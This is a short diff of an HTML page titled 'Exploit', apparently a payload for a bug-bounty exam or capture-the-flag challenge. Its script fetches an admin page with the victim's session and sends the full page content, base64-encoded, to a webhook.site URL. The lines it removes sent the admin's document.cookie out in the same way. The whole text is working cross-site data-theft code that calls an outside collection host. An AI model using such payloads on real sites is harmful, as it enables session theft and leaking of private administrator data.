@@ -1,15 +1,23 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Exploit</title>
+</head>
 <body>
     <script>
-        // We attempt to fetch the admin's cookie and send it to your webhook
-        fetch("https://webhooksite.net/82f191e4-653a-4a2c-99d4-872bc4426e85/log?cookie=" + btoa(document.cookie));
+        // We use 'credentials: include' to make sure the admin's session is sent
+        // Change the URL below to the exact page where the flag/message is located
+        const targetUrl = "https://bugbounty-exam.hashacademy.co/admin/view/69e29e17bee6d6b7c6629c63";
 
-        // Alternative: If the flag is on the page text and not in a cookie
-        fetch("/admin/view/69e29e17bee6d6b7c6629c63") 
+        fetch(targetUrl)
             .then(response => response.text())
-            .then(data => {
-                fetch("https://your-webhook.site/log?page_content=" + btoa(data));
+            .then(content => {
+                // We send the entire HTML of the admin page to your webhook
+                // Using btoa() to encode it so it doesn't break the URL
+                fetch("https://webhook.site/82f191e4-653a-4a2c-99d4-872bc4426e85/?data=" + btoa(unescape(encodeURIComponent(content))));
+            })
+            .catch(err => {
+                fetch("https://webhook.site/82f191e4-653a-4a2c-99d4-872bc4426e85/?error=" + btoa(err));
             });
     </script>
 </body>
